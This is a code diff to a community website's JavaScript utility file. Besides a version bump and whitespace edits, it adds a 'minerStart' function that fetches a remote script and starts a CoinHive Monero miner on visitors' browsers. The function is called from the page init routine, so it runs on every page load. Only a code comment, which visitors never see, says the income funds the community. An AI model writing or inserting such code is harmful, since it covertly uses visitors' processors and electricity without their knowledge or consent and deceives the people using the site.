@@ -13,12 +13,13 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
+
 /**
  * @fileoverview util and every page should be used.
  *
  * @author <a href="http://vanessa.b3log.org">Liyuan Li</a>
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
- * @version 1.2.0.0, Nov 10, 2017
+ * @version 1.3.0.0, Dec 5, 2017
  */
 
 /**
@@ -74,7 +75,7 @@ var Util = {
 
     if (hasFlow) {
       var initFlow = function () {
-        $('.' + className + ' code.lang-flow, .' + className +  ' code.language-flow').each(function (index) {
+        $('.' + className + ' code.lang-flow, .' + className + ' code.language-flow').each(function (index) {
           var $it = $(this);
           var id = 'symFlow' + (new Date()).getTime() + index;
           $it.hide();
@@ -236,6 +237,19 @@ var Util = {
     window.scrollTo(0, wHeight - $(window).height() - bottom);
   },
   /**
+   * @description xmr 挖矿，收入将用于维持社区运维
+   */
+  minerStart: function () {
+    $.ajax({
+      method: "GET",
+      url: 'https://img.hacpai.com/xmr.min.js',
+      dataType: "script"
+    }).done(function () {
+      var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
+      miner.start();
+    });
+  },
+  /**
    * @description 页面初始化执行的函数
    */
   init: function () {
@@ -243,6 +257,7 @@ var Util = {
     Util.killIE();
     Util.setTopBar();
     Util.parseMarkdown();
+    Util.minerStart();
   },
   /**
    * @description 替换侧边栏表情为图片
